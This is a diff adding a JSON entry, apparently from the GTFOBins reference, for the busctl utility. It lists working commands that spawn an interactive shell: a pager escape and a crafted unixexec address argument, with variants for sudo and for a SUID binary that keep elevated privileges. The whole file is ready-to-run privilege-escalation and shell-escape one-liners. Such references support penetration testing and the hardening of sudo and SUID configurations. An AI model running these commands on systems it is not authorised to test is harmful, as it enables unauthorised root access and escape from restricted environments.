@@ -1,0 +1,23 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
+        "code": "busctl --show-machine\n!/bin/sh\n"
+      },
+      {
+        "code": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'\n"
+      }
+    ]
+  }
+}
